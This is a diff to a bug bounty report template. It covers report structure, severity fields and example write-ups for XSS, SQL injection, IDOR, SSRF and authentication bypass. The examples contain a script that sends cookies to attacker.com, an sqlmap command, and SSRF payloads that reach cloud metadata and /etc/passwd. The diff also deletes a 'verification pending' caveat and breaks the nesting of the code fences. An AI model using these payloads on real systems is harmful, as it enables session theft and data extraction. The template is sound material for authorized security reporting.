@@ -1,7 +1,5 @@
 # 🐛 Bug Bounty Report Template
 
-> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.
-
 ```
 ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
 ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
@@ -21,7 +19,7 @@
 
 ## 🎯 Quick Template
 
-````markdown
+```markdown
 ## Summary
 [One-line description of the vulnerability]
 
@@ -47,7 +45,7 @@
 
 ## Remediation
 [How to fix it]
-````
+```
 
 ---
 
@@ -67,7 +65,7 @@ Examples:
 
 ## 📋 Detailed Report Structure
 
-````markdown
+```markdown
 # [Vulnerability Type] in [Feature/Endpoint]
 
 ## Summary
@@ -79,11 +77,9 @@ allows an attacker to [impact]. This vulnerability affects [scope/users].
 | Metric | Value |
 |--------|-------|
 | **Severity** | Critical / High / Medium / Low |
-| **CVSS Version / Score** | CVSS 4.0 / X.X (if the program uses CVSS) |
-| **CVSS Vector** | `CVSS:4.0/...` |
+| **CVSS Score** | X.X |
+| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
 | **CWE** | CWE-XXX: [CWE Name] |
-| **Tested Role** | Unauthenticated / User / Admin |
-| **Confidence** | Confirmed / High / Moderate |
 
 ## Vulnerability Details
 
@@ -143,7 +139,7 @@ Content-Type: application/json
 ## Proof of Concept
 
 ### Payload Used
-````
+```
 [Your payload here]
 ```
 
@@ -222,7 +218,7 @@ cursor.execute(query, (user_input,))
 
 ### XSS (Cross-Site Scripting)
 
-````markdown
+```markdown
 ## Summary
 A reflected/stored XSS vulnerability in [endpoint] allows attackers to execute 
 arbitrary JavaScript in victims' browsers.
@@ -248,11 +244,11 @@ arbitrary JavaScript in victims' browsers.
 fetch('https://attacker.com/steal?c='+document.cookie)
 </script>
 ```
-````
+```
 
 ### SQL Injection
 
-````markdown
+```markdown
 ## Summary
 SQL Injection in [parameter] at [endpoint] allows extraction of database contents.
 
@@ -272,11 +268,11 @@ SQL Injection in [parameter] at [endpoint] allows extraction of database content
 ```bash
 sqlmap -u "https://example.com/page?id=1" --dbs --batch
 ```
-````
+```
 
 ### IDOR (Insecure Direct Object Reference)
 
-````markdown
+```markdown
 ## Summary
 IDOR vulnerability in [endpoint] allows accessing other users' [resource].
 
@@ -297,16 +293,16 @@ IDOR vulnerability in [endpoint] allows accessing other users' [resource].
 | `/api/users/100` | User A's data ✓ |
 | `/api/users/101` | User B's data ✗ |
 | `/api/users/102` | User C's data ✗ |
-````
+```
 
 ### SSRF (Server-Side Request Forgery)
 
-````markdown
+```markdown
 ## Summary
 SSRF in [feature] allows making requests to internal services.
 
 ## Payload
-````
+```
 https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
 https://example.com/fetch?url=http://localhost:6379/
 https://example.com/fetch?url=file:///etc/passwd
@@ -328,7 +324,7 @@ instance-id: i-1234567890abcdef0
 
 ### Authentication Bypass
 
-````markdown
+```markdown
 ## Summary
 Authentication bypass in [feature] allows unauthorized access to [resource].
 
@@ -344,7 +340,7 @@ Authentication bypass in [feature] allows unauthorized access to [resource].
 - Admin panel access
 - User impersonation
 - Data manipulation
-````
+```
 
 ---
 
@@ -391,7 +387,7 @@ Authentication bypass in [feature] allows unauthorized access to [resource].
 
 ## ✅ Submission Checklist
 
-````markdown
+```markdown
 ## Before Submitting
 
 □ Clear, descriptive title
@@ -406,7 +402,7 @@ Authentication bypass in [feature] allows unauthorized access to [resource].
 □ Grammar/spelling checked
 □ Sensitive data redacted
 □ Contact info included
-````
+```
 
 ---
 
